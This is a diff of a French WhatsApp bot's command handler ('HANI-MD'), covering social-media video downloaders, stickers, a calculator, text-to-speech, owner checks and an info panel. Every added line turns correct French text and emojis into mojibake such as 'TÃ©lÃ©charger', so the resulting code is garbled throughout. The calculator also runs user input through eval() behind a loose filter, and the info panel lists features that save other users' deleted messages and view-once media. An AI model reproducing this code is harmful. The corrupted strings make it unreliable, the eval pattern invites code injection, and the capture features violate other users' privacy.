-        return send(`❌ Impossible de télécharger "${args}"\n\n💡 Vérifie le lien ou le titre`);
+        return send(`âŒ Impossible de tÃ©lÃ©charger "${args}"\n\nðŸ’¡ VÃ©rifie le lien ou le titre`);
         
       } catch (e) {
-        return send(`❌ Erreur: ${e.message}`);
+        return send(`âŒ Erreur: ${e.message}`);
       }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // 📥 TÉLÉCHARGEMENT RÉSEAUX SOCIAUX
-    // ═══════════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // ðŸ“¥ TÃ‰LÃ‰CHARGEMENT RÃ‰SEAUX SOCIAUX
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
     case "tiktok":
     case "tt":
     case "tiktokdl": {
       if (!args) {
-        return send(`📱 *TÉLÉCHARGER TIKTOK*\n\n📋 *Usage:*\n\`.tiktok [lien TikTok]\`\n\n📝 *Exemple:*\n\`.tiktok https://vm.tiktok.com/...\`\n\n🎬 Télécharge la vidéo sans watermark!`);
+        return send(`ðŸ“± *TÃ‰LÃ‰CHARGER TIKTOK*\n\nðŸ“‹ *Usage:*\n\`.tiktok [lien TikTok]\`\n\nðŸ“ *Exemple:*\n\`.tiktok https://vm.tiktok.com/...\`\n\nðŸŽ¬ TÃ©lÃ©charge la vidÃ©o sans watermark!`);
       }
       
       if (!args.includes("tiktok.com")) {
-        return send(`❌ Lien TikTok invalide!\n\n💡 Exemple:\n\`.tiktok https://vm.tiktok.com/ABC123\``);
+        return send(`âŒ Lien TikTok invalide!\n\nðŸ’¡ Exemple:\n\`.tiktok https://vm.tiktok.com/ABC123\``);
       }
       
-      await send("📱 *Téléchargement TikTok en cours...*\n⏳ _Sans watermark..._");
+      await send("ðŸ“± *TÃ©lÃ©chargement TikTok en cours...*\nâ³ _Sans watermark..._");
       
       try {
         let videoBuffer = null;
@@ -3829,7 +3829,7 @@ async function handleCommand(hani, msg, db) {
             }
           }
         } catch (e) {
-          console.log("[TIKTOK] API 1 échouée:", e.message);
+          console.log("[TIKTOK] API 1 Ã©chouÃ©e:", e.message);
         }
         
         // API 2: Agatz
@@ -3848,7 +3848,7 @@ async function handleCommand(hani, msg, db) {
               }
             }
           } catch (e) {
-            console.log("[TIKTOK] API 2 échouée:", e.message);
+            console.log("[TIKTOK] API 2 Ã©chouÃ©e:", e.message);
           }
         }
         
@@ -3867,7 +3867,7 @@ async function handleCommand(hani, msg, db) {
               }
             }
           } catch (e) {
-            console.log("[TIKTOK] API 3 échouée:", e.message);
+            console.log("[TIKTOK] API 3 Ã©chouÃ©e:", e.message);
           }
         }
         
@@ -3875,16 +3875,16 @@ async function handleCommand(hani, msg, db) {
           await hani.sendMessage(from, {
             video: videoBuffer,
             mimetype: "video/mp4",
-            caption: `📱 *TikTok*\n${videoInfo.author ? `👤 @${videoInfo.author}` : ""}\n\n✅ Sans watermark!\n🔥 *Powered by HANI-MD*`
+            caption: `ðŸ“± *TikTok*\n${videoInfo.author ? `ðŸ‘¤ @${videoInfo.author}` : ""}\n\nâœ… Sans watermark!\nðŸ”¥ *Powered by HANI-MD*`
           }, { quoted: msg });
           
           return;
         }
         
-        return send(`❌ Impossible de télécharger cette vidéo TikTok\n\n💡 Vérifie que le lien est valide`);
+        return send(`âŒ Impossible de tÃ©lÃ©charger cette vidÃ©o TikTok\n\nðŸ’¡ VÃ©rifie que le lien est valide`);
         
       } catch (e) {
-        return send(`❌ Erreur: ${e.message}`);
+        return send(`âŒ Erreur: ${e.message}`);
       }
     }
 
@@ -3892,14 +3892,14 @@ async function handleCommand(hani, msg, db) {
     case "fb":
     case "fbdl": {
       if (!args) {
-        return send(`📘 *TÉLÉCHARGER FACEBOOK*\n\n📋 *Usage:*\n\`.fb [lien vidéo Facebook]\`\n\n📝 *Exemple:*\n\`.fb https://www.facebook.com/watch?v=...\`\n\n🎬 Télécharge la vidéo!`);
+        return send(`ðŸ“˜ *TÃ‰LÃ‰CHARGER FACEBOOK*\n\nðŸ“‹ *Usage:*\n\`.fb [lien vidÃ©o Facebook]\`\n\nðŸ“ *Exemple:*\n\`.fb https://www.facebook.com/watch?v=...\`\n\nðŸŽ¬ TÃ©lÃ©charge la vidÃ©o!`);
       }
       
       if (!args.includes("facebook.com") && !args.includes("fb.watch")) {
-        return send(`❌ Lien Facebook invalide!\n\n💡 Exemple:\n\`.fb https://www.facebook.com/watch?v=123\``);
+        return send(`âŒ Lien Facebook invalide!\n\nðŸ’¡ Exemple:\n\`.fb https://www.facebook.com/watch?v=123\``);
       }
       
-      await send("📘 *Téléchargement Facebook en cours...*");
+      await send("ðŸ“˜ *TÃ©lÃ©chargement Facebook en cours...*");
       
       try {
         let videoBuffer = null;
@@ -3918,7 +3918,7 @@ async function handleCommand(hani, msg, db) {
             }
           }
         } catch (e) {
-          console.log("[FB] API 1 échouée:", e.message);
+          console.log("[FB] API 1 Ã©chouÃ©e:", e.message);
         }
         
         // API 2: Agatz
@@ -3936,7 +3936,7 @@ async function handleCommand(hani, msg, db) {
               }
             }
           } catch (e) {
-            console.log("[FB] API 2 échouée:", e.message);
+            console.log("[FB] API 2 Ã©chouÃ©e:", e.message);
           }
         }
         
@@ -3944,16 +3944,16 @@ async function handleCommand(hani, msg, db) {
           await hani.sendMessage(from, {
             video: videoBuffer,
             mimetype: "video/mp4",
-            caption: `📘 *Vidéo Facebook*\n\n✅ Téléchargement terminé!\n🔥 *Powered by HANI-MD*`
+            caption: `ðŸ“˜ *VidÃ©o Facebook*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”¥ *Powered by HANI-MD*`
           }, { quoted: msg });
           
           return;
         }
         
-        return send(`❌ Impossible de télécharger cette vidéo Facebook\n\n💡 Vérifie que le lien est public`);
+        return send(`âŒ Impossible de tÃ©lÃ©charger cette vidÃ©o Facebook\n\nðŸ’¡ VÃ©rifie que le lien est public`);
         
       } catch (e) {
-        return send(`❌ Erreur: ${e.message}`);
+        return send(`âŒ Erreur: ${e.message}`);
       }
     }
 
@@ -3961,14 +3961,14 @@ async function handleCommand(hani, msg, db) {
     case "ig":
     case "igdl": {
       if (!args) {
-        return send(`📸 *TÉLÉCHARGER INSTAGRAM*\n\n📋 *Usage:*\n\`.ig [lien post/reel Instagram]\`\n\n📝 *Exemple:*\n\`.ig https://www.instagram.com/reel/...\`\n\n🎬 Télécharge photos et vidéos!`);
+        return send(`ðŸ“¸ *TÃ‰LÃ‰CHARGER INSTAGRAM*\n\nðŸ“‹ *Usage:*\n\`.ig [lien post/reel Instagram]\`\n\nðŸ“ *Exemple:*\n\`.ig https://www.instagram.com/reel/...\`\n\nðŸŽ¬ TÃ©lÃ©charge photos et vidÃ©os!`);
       }
       
       if (!args.includes("instagram.com")) {
-        return send(`❌ Lien Instagram invalide!\n\n💡 Exemple:\n\`.ig https://www.instagram.com/reel/ABC123\``);
+        return send(`âŒ Lien Instagram invalide!\n\nðŸ’¡ Exemple:\n\`.ig https://www.instagram.com/reel/ABC123\``);
       }
       
-      await send("📸 *Téléchargement Instagram en cours...*");
+      await send("ðŸ“¸ *TÃ©lÃ©chargement Instagram en cours...*");
       
       try {
         let mediaUrl = null;
@@ -3990,7 +3990,7 @@ async function handleCommand(hani, msg, db) {
             }
           }
         } catch (e) {
-          console.log("[IG] API 1 échouée:", e.message);
+          console.log("[IG] API 1 Ã©chouÃ©e:", e.message);
         }
         
         // API 2: Agatz
@@ -4010,7 +4010,7 @@ async function handleCommand(hani, msg, db) {
               }
             }
           } catch (e) {
-            console.log("[IG] API 2 échouée:", e.message);
+            console.log("[IG] API 2 Ã©chouÃ©e:", e.message);
           }
         }
         
@@ -4022,22 +4022,22 @@ async function handleCommand(hani, msg, db) {
             await hani.sendMessage(from, {
               video: mediaBuffer,
               mimetype: "video/mp4",
-              caption: `📸 *Instagram*\n\n✅ Téléchargement terminé!\n🔥 *Powered by HANI-MD*`
+              caption: `ðŸ“¸ *Instagram*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”¥ *Powered by HANI-MD*`
             }, { quoted: msg });
           } else {
             await hani.sendMessage(from, {
               image: mediaBuffer,
-              caption: `📸 *Instagram*\n\n✅ Téléchargement terminé!\n🔥 *Powered by HANI-MD*`
+              caption: `ðŸ“¸ *Instagram*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”¥ *Powered by HANI-MD*`
             }, { quoted: msg });
           }
           
           return;
         }
         
-        return send(`❌ Impossible de télécharger ce contenu Instagram\n\n💡 Vérifie que le compte est public`);
+        return send(`âŒ Impossible de tÃ©lÃ©charger ce contenu Instagram\n\nðŸ’¡ VÃ©rifie que le compte est public`);
         
       } catch (e) {
-        return send(`❌ Erreur: ${e.message}`);
+        return send(`âŒ Erreur: ${e.message}`);
       }
     }
 
@@ -4045,14 +4045,14 @@ async function handleCommand(hani, msg, db) {
     case "x":
     case "twdl": {
       if (!args) {
-        return send(`🐦 *TÉLÉCHARGER TWITTER/X*\n\n📋 *Usage:*\n\`.twitter [lien tweet]\`\n\n📝 *Exemple:*\n\`.twitter https://x.com/user/status/...\`\n\n🎬 Télécharge les médias!`);
+        return send(`ðŸ¦ *TÃ‰LÃ‰CHARGER TWITTER/X*\n\nðŸ“‹ *Usage:*\n\`.twitter [lien tweet]\`\n\nðŸ“ *Exemple:*\n\`.twitter https://x.com/user/status/...\`\n\nðŸŽ¬ TÃ©lÃ©charge les mÃ©dias!`);
       }
       
       if (!args.includes("twitter.com") && !args.includes("x.com")) {
-        return send(`❌ Lien Twitter/X invalide!\n\n💡 Exemple:\n\`.twitter https://x.com/user/status/123\``);
+        return send(`âŒ Lien Twitter/X invalide!\n\nðŸ’¡ Exemple:\n\`.twitter https://x.com/user/status/123\``);
       }
       
-      await send("🐦 *Téléchargement Twitter/X en cours...*");
+      await send("ðŸ¦ *TÃ©lÃ©chargement Twitter/X en cours...*");
       
       try {
         let mediaUrl = null;
@@ -4074,7 +4074,7 @@ async function handleCommand(hani, msg, db) {
             }
           }
         } catch (e) {
-          console.log("[TWITTER] API échouée:", e.message);
+          console.log("[TWITTER] API Ã©chouÃ©e:", e.message);
         }
         
         if (mediaUrl) {
@@ -4085,36 +4085,36 @@ async function handleCommand(hani, msg, db) {
             await hani.sendMessage(from, {
               video: mediaBuffer,
               mimetype: "video/mp4",
-              caption: `🐦 *Twitter/X*\n\n✅ Téléchargement terminé!\n🔥 *Powered by HANI-MD*`
+              caption: `ðŸ¦ *Twitter/X*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”¥ *Powered by HANI-MD*`
             }, { quoted: msg });
           } else {
             await hani.sendMessage(from, {
               image: mediaBuffer,
-              caption: `🐦 *Twitter/X*\n\n✅ Téléchargement terminé!\n🔥 *Powered by HANI-MD*`
+              caption: `ðŸ¦ *Twitter/X*\n\nâœ… TÃ©lÃ©chargement terminÃ©!\nðŸ”¥ *Powered by HANI-MD*`
             }, { quoted: msg });
           }
           
           return;
         }
         
-        return send(`❌ Impossible de télécharger ce contenu Twitter/X\n\n💡 Vérifie le lien`);
+        return send(`âŒ Impossible de tÃ©lÃ©charger ce contenu Twitter/X\n\nðŸ’¡ VÃ©rifie le lien`);
         
       } catch (e) {
-        return send(`❌ Erreur: ${e.message}`);
+        return send(`âŒ Erreur: ${e.message}`);
       }
     }
 
     case "pinterest":
     case "pin": {
       if (!args) {
-        return send(`📌 *TÉLÉCHARGER PINTEREST*\n\n📋 *Usage:*\n\`.pin [lien Pinterest]\`\n\n📝 *Exemple:*\n\`.pin https://pin.it/...\`\n\n🖼️ Télécharge l'image en HD!`);
+        return send(`ðŸ“Œ *TÃ‰LÃ‰CHARGER PINTEREST*\n\nðŸ“‹ *Usage:*\n\`.pin [lien Pinterest]\`\n\nðŸ“ *Exemple:*\n\`.pin https://pin.it/...\`\n\nðŸ–¼ï¸ TÃ©lÃ©charge l'image en HD!`);
       }
       
       if (!args.includes("pinterest") && !args.includes("pin.it")) {
-        return send(`❌ Lien Pinterest invalide!`);
+        return send(`âŒ Lien Pinterest invalide!`);
       }
       
-      await send("📌 *Téléchargement Pinterest en cours...*");
+      await send("ðŸ“Œ *TÃ©lÃ©chargement Pinterest en cours...*");
       
       try {
         let imageUrl = null;
@@ -4128,7 +4128,7 @@ async function handleCommand(hani, msg, db) {
             imageUrl = data.data.image || data.data.url;
           }
         } catch (e) {
-          console.log("[PIN] API échouée:", e.message);
+          console.log("[PIN] API Ã©chouÃ©e:", e.message);
         }
         
         if (imageUrl) {
@@ -4137,41 +4137,41 @@ async function handleCommand(hani, msg, db) {
           
           await hani.sendMessage(from, {
             image: imgBuffer,
-            caption: `📌 *Pinterest*\n\n✅ Image HD téléchargée!\n🔥 *Powered by HANI-MD*`
+            caption: `ðŸ“Œ *Pinterest*\n\nâœ… Image HD tÃ©lÃ©chargÃ©e!\nðŸ”¥ *Powered by HANI-MD*`
           }, { quoted: msg });
           
           return;
         }
         
-        return send(`❌ Impossible de télécharger cette image`);
+        return send(`âŒ Impossible de tÃ©lÃ©charger cette image`);
         
       } catch (e) {
-        return send(`❌ Erreur: ${e.message}`);
+        return send(`âŒ Erreur: ${e.message}`);
       }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // 🎨 OUTILS - Sticker, Calculatrice, etc.
-    // ═══════════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // ðŸŽ¨ OUTILS - Sticker, Calculatrice, etc.
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
     case "sticker":
     case "s": {
-      // Vérifier si c'est une réponse à un média
+      // VÃ©rifier si c'est une rÃ©ponse Ã  un mÃ©dia
       const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
       const hasImage = quotedMsg?.imageMessage || msg.message?.imageMessage;
       const hasVideo = quotedMsg?.videoMessage || msg.message?.videoMessage;
       
       if (!hasImage && !hasVideo) {
-        return send(`🎨 *CRÉER UN STICKER*\n\n📋 *Usage:*\nRéponds à une image ou vidéo avec \`.sticker\`\n\nOu envoie une image avec la légende \`.sticker\`\n\n💡 Les vidéos courtes deviennent des stickers animés!`);
+        return send(`ðŸŽ¨ *CRÃ‰ER UN STICKER*\n\nðŸ“‹ *Usage:*\nRÃ©ponds Ã  une image ou vidÃ©o avec \`.sticker\`\n\nOu envoie une image avec la lÃ©gende \`.sticker\`\n\nðŸ’¡ Les vidÃ©os courtes deviennent des stickers animÃ©s!`);
       }
       
-      await send("🎨 *Création du sticker en cours...*");
+      await send("ðŸŽ¨ *CrÃ©ation du sticker en cours...*");
       
       try {
         let mediaBuffer;
         let isVideo = false;
         
-        // Télécharger le média
+        // TÃ©lÃ©charger le mÃ©dia
         if (quotedMsg?.imageMessage || quotedMsg?.videoMessage) {
           const downloadMsg = {
             ...msg,
@@ -4185,10 +4185,10 @@ async function handleCommand(hani, msg, db) {
         }
         
         if (!mediaBuffer) {
-          return send(`❌ Impossible de télécharger le média`);
+          return send(`âŒ Impossible de tÃ©lÃ©charger le mÃ©dia`);
         }
         
-        // Créer le sticker
+        // CrÃ©er le sticker
         await hani.sendMessage(from, {
           sticker: mediaBuffer,
           packname: "HANI-MD",
@@ -4199,7 +4199,7 @@ async function handleCommand(hani, msg, db) {
         
       } catch (e) {
         console.log("[STICKER] Erreur:", e.message);
-        return send(`❌ Erreur lors de la création du sticker: ${e.message}`);
+        return send(`âŒ Erreur lors de la crÃ©ation du sticker: ${e.message}`);
       }
     }
 
@@ -4208,7 +4208,7 @@ async function handleCommand(hani, msg, db) {
       const quotedSticker = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage;
       
       if (!quotedSticker) {
-        return send(`🖼️ *STICKER → IMAGE*\n\n📋 *Usage:*\nRéponds à un sticker avec \`.toimg\`\n\n💡 Convertit le sticker en image!`);
+        return send(`ðŸ–¼ï¸ *STICKER â†’ IMAGE*\n\nðŸ“‹ *Usage:*\nRÃ©ponds Ã  un sticker avec \`.toimg\`\n\nðŸ’¡ Convertit le sticker en image!`);
       }
       
       try {
@@ -4220,13 +4220,13 @@ async function handleCommand(hani, msg, db) {
         
         await hani.sendMessage(from, {
           image: stickerBuffer,
-          caption: `🖼️ Voici ton sticker converti en image!\n\n✅ *Powered by HANI-MD*`
+          caption: `ðŸ–¼ï¸ Voici ton sticker converti en image!\n\nâœ… *Powered by HANI-MD*`
         }, { quoted: msg });
         
         return;
         
       } catch (e) {
-        return send(`❌ Erreur: ${e.message}`);
+        return send(`âŒ Erreur: ${e.message}`);
       }
     }
 
@@ -4234,14 +4234,14 @@ async function handleCommand(hani, msg, db) {
     case "calculate":
     case "calculer": {
       if (!args) {
-        return send(`🔢 *CALCULATRICE*\n\n📋 *Usage:*\n\`.calc [expression]\`\n\n📝 *Exemples:*\n\`.calc 2+2\`\n\`.calc 100*5/2\`\n\`.calc (10+5)*3\`\n\`.calc sqrt(16)\`\n\`.calc 2^8\``);
+        return send(`ðŸ”¢ *CALCULATRICE*\n\nðŸ“‹ *Usage:*\n\`.calc [expression]\`\n\nðŸ“ *Exemples:*\n\`.calc 2+2\`\n\`.calc 100*5/2\`\n\`.calc (10+5)*3\`\n\`.calc sqrt(16)\`\n\`.calc 2^8\``);
       }
       
       try {
-        // Nettoyer et sécuriser l'expression
+        // Nettoyer et sÃ©curiser l'expression
         let expression = args
           .replace(/x/gi, "*")
-          .replace(/÷/g, "/")
+          .replace(/Ã·/g, "/")
           .replace(/\^/g, "**")
           .replace(/sqrt\(([^)]+)\)/gi, "Math.sqrt($1)")
           .replace(/sin\(([^)]+)\)/gi, "Math.sin($1)")
@@ -4252,17 +4252,17 @@ async function handleCommand(hani, msg, db) {
           .replace(/pi/gi, "Math.PI")
           .replace(/e(?![a-z])/gi, "Math.E");
         
-        // Vérifier que l'expression est sûre
+        // VÃ©rifier que l'expression est sÃ»re
         if (!/^[0-9+\-*/.()Math\s,sqrtsincoantlog]+$/i.test(expression.replace(/\./g, ''))) {
-          return send(`❌ Expression invalide!`);
+          return send(`âŒ Expression invalide!`);
         }
         
         const result = eval(expression);
         
-        return send(`🔢 *CALCULATRICE*\n\n📝 Expression: \`${args}\`\n✅ Résultat: *${result}*`);
+        return send(`ðŸ”¢ *CALCULATRICE*\n\nðŸ“ Expression: \`${args}\`\nâœ… RÃ©sultat: *${result}*`);
         
       } catch (e) {
-        return send(`❌ Expression invalide: ${e.message}`);
+        return send(`âŒ Expression invalide: ${e.message}`);
       }
     }
 
@@ -4270,10 +4270,10 @@ async function handleCommand(hani, msg, db) {
     case "say":
     case "parle": {
       if (!args) {
-        return send(`🔊 *TEXT TO SPEECH*\n\n📋 *Usage:*\n\`.tts [texte]\`\n\n📝 *Exemple:*\n\`.tts Bonjour, je suis HANI\`\n\n🗣️ Convertit le texte en audio!`);
+        return send(`ðŸ”Š *TEXT TO SPEECH*\n\nðŸ“‹ *Usage:*\n\`.tts [texte]\`\n\nðŸ“ *Exemple:*\n\`.tts Bonjour, je suis HANI\`\n\nðŸ—£ï¸ Convertit le texte en audio!`);
       }
       
-      await send("🔊 *Génération de l'audio...*");
+      await send("ðŸ”Š *GÃ©nÃ©ration de l'audio...*");
       
       try {
         // Utiliser l'API Google TTS
@@ -4295,7 +4295,7 @@ async function handleCommand(hani, msg, db) {
         return;
         
       } catch (e) {
-        return send(`❌ Erreur TTS: ${e.message}`);
+        return send(`âŒ Erreur TTS: ${e.message}`);
       }
     }
 
@@ -4303,82 +4303,82 @@ async function handleCommand(hani, msg, db) {
       const senderNum = extractNumber(sender);
       const botNum = botNumberClean;
       
-      // Afficher tous les numéros owner
+      // Afficher tous les numÃ©ros owner
       const allOwnerNumbers = config.NUMERO_OWNER.split(',').map(n => n.trim());
       const cleanOwnerNumbers = allOwnerNumbers.map(n => n.replace(/[^0-9]/g, ''));
       
-      // Vérification détaillée
+      // VÃ©rification dÃ©taillÃ©e
       const matchDetails = cleanOwnerNumbers.map(owner => {
         const exactMatch = senderNumber === owner;
         const endsWithMatch = senderNumber.endsWith(owner) || owner.endsWith(senderNumber);
-        return `• ${owner} ${exactMatch ? "✅ EXACT" : endsWithMatch ? "✅ PARTIEL" : "❌ NON"}`;
-      }).join('\n┃ ');
+        return `â€¢ ${owner} ${exactMatch ? "âœ… EXACT" : endsWithMatch ? "âœ… PARTIEL" : "âŒ NON"}`;
+      }).join('\nâ”ƒ ');
       
       const info = `
-╭━━━ 🔍 *QUI SUIS-JE ?* ━━━╮
-┃
-┃ 📱 *Sender JID:*
-┃ ${sender}
-┃
-┃ 📞 *Ton numéro (extrait):*
-┃ ${senderNumber}
-┃
-┃ 🤖 *Numéro du bot:*
-┃ ${botNum}
-┃
-┃ 👑 *Owners dans .env:*
-┃ ${allOwnerNumbers.join(', ')}
-┃
-┃ 🔍 *Correspondance:*
-┃ ${matchDetails}
-┃
-┃ 🔑 *fromMe:*
-┃ ${msg.key.fromMe ? "OUI" : "NON"}
-┃
-┃ ━━━━━━━━━━━━━━━━━━━━
-┃ ✅ *Es-tu owner ?*
-┃ ${isOwner ? "OUI ✓" : "NON ✗"}
-┃
-┃ 🛡️ *Es-tu sudo ?*
-┃ ${isSudo ? "OUI ✓" : "NON ✗"}
-┃
-┃ ✅ *Es-tu approuvé ?*
-┃ ${isApproved ? "OUI ✓" : "NON ✗"}
-┃
-┃ 🏷️ *Ton rôle:*
-┃ ${userRole.toUpperCase()}
-┃
-╰━━━━━━━━━━━━━━━━━━━━━━╯
+â•­â”â”â” ðŸ” *QUI SUIS-JE ?* â”â”â”â•®
+â”ƒ
+â”ƒ ðŸ“± *Sender JID:*
+â”ƒ ${sender}
+â”ƒ
+â”ƒ ðŸ“ž *Ton numÃ©ro (extrait):*
+â”ƒ ${senderNumber}
+â”ƒ
+â”ƒ ðŸ¤– *NumÃ©ro du bot:*
+â”ƒ ${botNum}
+â”ƒ
+â”ƒ ðŸ‘‘ *Owners dans .env:*
+â”ƒ ${allOwnerNumbers.join(', ')}
+â”ƒ
+â”ƒ ðŸ” *Correspondance:*
+â”ƒ ${matchDetails}
+â”ƒ
+â”ƒ ðŸ”‘ *fromMe:*
+â”ƒ ${msg.key.fromMe ? "OUI" : "NON"}
+â”ƒ
+â”ƒ â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
+â”ƒ âœ… *Es-tu owner ?*
+â”ƒ ${isOwner ? "OUI âœ“" : "NON âœ—"}
+â”ƒ
+â”ƒ ðŸ›¡ï¸ *Es-tu sudo ?*
+â”ƒ ${isSudo ? "OUI âœ“" : "NON âœ—"}
+â”ƒ
+â”ƒ âœ… *Es-tu approuvÃ© ?*
+â”ƒ ${isApproved ? "OUI âœ“" : "NON âœ—"}
+â”ƒ
+â”ƒ ðŸ·ï¸ *Ton rÃ´le:*
+â”ƒ ${userRole.toUpperCase()}
+â”ƒ
+â•°â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•¯
 
-${!isOwner ? `⚠️ *Pour te définir comme owner:*
-Modifie .env et ajoute ton numéro:
-NUMERO_OWNER=...,...,${senderNumber}` : "✅ Tu es bien reconnu comme OWNER!"}
+${!isOwner ? `âš ï¸ *Pour te dÃ©finir comme owner:*
+Modifie .env et ajoute ton numÃ©ro:
+NUMERO_OWNER=...,...,${senderNumber}` : "âœ… Tu es bien reconnu comme OWNER!"}
       `.trim();
       
       return reply(info);
     }
 
     case "setowner": {
-      // Seul le bot lui-même ou fromMe peut exécuter
+      // Seul le bot lui-mÃªme ou fromMe peut exÃ©cuter
       if (!msg.key.fromMe && senderNumber !== botNumberClean) {
-        return reply("❌ Seul le propriétaire du téléphone peut faire ça.");
+        return reply("âŒ Seul le propriÃ©taire du tÃ©lÃ©phone peut faire Ã§a.");
       }
       
       const newOwner = args.replace(/[^0-9]/g, "");
       if (!newOwner || newOwner.length < 10) {
-        return reply(`❌ Numéro invalide.\n\nUtilisation: .setowner 22550252467`);
+        return reply(`âŒ NumÃ©ro invalide.\n\nUtilisation: .setowner 22550252467`);
       }
       
-      // Mettre à jour la config en mémoire
+      // Mettre Ã  jour la config en mÃ©moire
       config.NUMERO_OWNER = newOwner;
       
-      return reply(`✅ Owner temporairement défini: ${newOwner}\n\n⚠️ Pour rendre permanent, modifie .env:\nNUMERO_OWNER=${newOwner}`);
+      return reply(`âœ… Owner temporairement dÃ©fini: ${newOwner}\n\nâš ï¸ Pour rendre permanent, modifie .env:\nNUMERO_OWNER=${newOwner}`);
     }
 
     case "menu":
     case "help":
     case "aide": {
-      // Utiliser le nouveau système de menu stylisé
+      // Utiliser le nouveau systÃ¨me de menu stylisÃ©
       try {
         const menuSystem = require('./lib/MenuSystem');
         const ownerNumber = (config.NUMERO_OWNER || '').replace(/[^0-9]/g, '');
@@ -4395,7 +4395,7 @@ NUMERO_OWNER=...,...,${senderNumber}` : "✅ Tu es bien reconnu comme OWNER!"}
           theme: 'elegant'
         };
         
-        // Si une catégorie est spécifiée
+        // Si une catÃ©gorie est spÃ©cifiÃ©e
         if (args) {
           const categoryMenu = menuSystem.generateCategoryMenu(args.toLowerCase(), userInfo);
           return send(categoryMenu);
@@ -4417,65 +4417,65 @@ NUMERO_OWNER=...,...,${senderNumber}` : "✅ Tu es bien reconnu comme OWNER!"}
     case "info": {
       const uptime = formatUptime(Date.now() - db.data.stats.startTime);
       const infoText = `
-╭━━━ 🤖 *HANI-MD INFO* ━━━╮
-┃
-┃ 📛 Nom: ${config.BOT_NAME}
-┃ 📱 Version: ${config.VERSION}
-┃ 👑 Owner: ${config.NOM_OWNER}
-┃ 🔧 Préfixe: ${config.PREFIXE}
-┃ 🌐 Mode: ${config.MODE}
-┃
-┃ 📊 *Statistiques*
-┃ ⏱️ Uptime: ${uptime}
-┃ 📨 Commandes: ${db.data.stats.commands}
-┃ 👥 Utilisateurs: ${Object.keys(db.data.users).length}
-┃ 🏘️ Groupes: ${Object.keys(db.data.groups).length}
-┃
-┃ 🛡️ *Protections AUTOMATIQUES*
-┃ • Anti-delete: ${protectionState.antidelete ? "✅" : "❌"}
-┃ • Anti-appel: ${protectionState.anticall ? "✅" : "❌"}
-┃ • Vue unique: ${protectionState.autoViewOnce ? "✅" : "❌"}
-┃ • Vocal unique: ${protectionState.autoViewOnceAudio ? "✅" : "❌"}
-┃ • Save statuts: ${protectionState.autoSaveStatus ? "✅" : "❌"}
-┃ • Anti-delete statut: ${protectionState.antideletestatus ? "✅" : "❌"}
-┃
-╰━━━━━━━━━━━━━━━━━━━━━━━━╯
+â•­â”â”â” ðŸ¤– *HANI-MD INFO* â”â”â”â•®
+â”ƒ
+â”ƒ ðŸ“› Nom: ${config.BOT_NAME}
+â”ƒ ðŸ“± Version: ${config.VERSION}
+â”ƒ ðŸ‘‘ Owner: ${config.NOM_OWNER}
+â”ƒ ðŸ”§ PrÃ©fixe: ${config.PREFIXE}
+â”ƒ ðŸŒ Mode: ${config.MODE}
+â”ƒ
+â”ƒ ðŸ“Š *Statistiques*
+â”ƒ â±ï¸ Uptime: ${uptime}
+â”ƒ ðŸ“¨ Commandes: ${db.data.stats.commands}
+â”ƒ ðŸ‘¥ Utilisateurs: ${Object.keys(db.data.users).length}
+â”ƒ ðŸ˜ï¸ Groupes: ${Object.keys(db.data.groups).length}
+â”ƒ
+â”ƒ ðŸ›¡ï¸ *Protections AUTOMATIQUES*
+â”ƒ â€¢ Anti-delete: ${protectionState.antidelete ? "âœ…" : "âŒ"}
+â”ƒ â€¢ Anti-appel: ${protectionState.anticall ? "âœ…" : "âŒ"}
+â”ƒ â€¢ Vue unique: ${protectionState.autoViewOnce ? "âœ…" : "âŒ"}
+â”ƒ â€¢ Vocal unique: ${protectionState.autoViewOnceAudio ? "âœ…" : "âŒ"}
+â”ƒ â€¢ Save statuts: ${protectionState.autoSaveStatus ? "âœ…" : "âŒ"}
+â”ƒ â€¢ Anti-delete statut: ${protectionState.antideletestatus ? "âœ…" : "âŒ"}
+â”ƒ
+â•°â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â•¯
 
-📨 _Tout est envoyé dans "Moi-même"_
+ðŸ“¨ _Tout est envoyÃ© dans "Moi-mÃªme"_
 `;
       return send(infoText);
     }
 
     case "stats": {
       const uptime = formatUptime(Date.now() - db.data.stats.startTime);
-      return send(`📊 *Statistiques HANI-MD*
+      return send(`ðŸ“Š *Statistiques HANI-MD*
 
-⏱️ En ligne depuis: ${uptime}
-📨 Commandes exécutées: ${db.data.stats.commands}
-💬 Messages traités: ${db.data.stats.messages || 0}
-👥 Utilisateurs: ${Object.keys(db.data.users).length}
-🏘️ Groupes: ${Object.keys(db.data.groups).length}
-🚫 Bannis: ${db.data.banned.length}
-👑 Sudos: ${db.data.sudo.length}`);
+â±ï¸ En ligne depuis: ${uptime}
+ðŸ“¨ Commandes exÃ©cutÃ©es: ${db.data.stats.commands}
+ðŸ’¬ Messages traitÃ©s: ${db.data.stats.messages || 0}
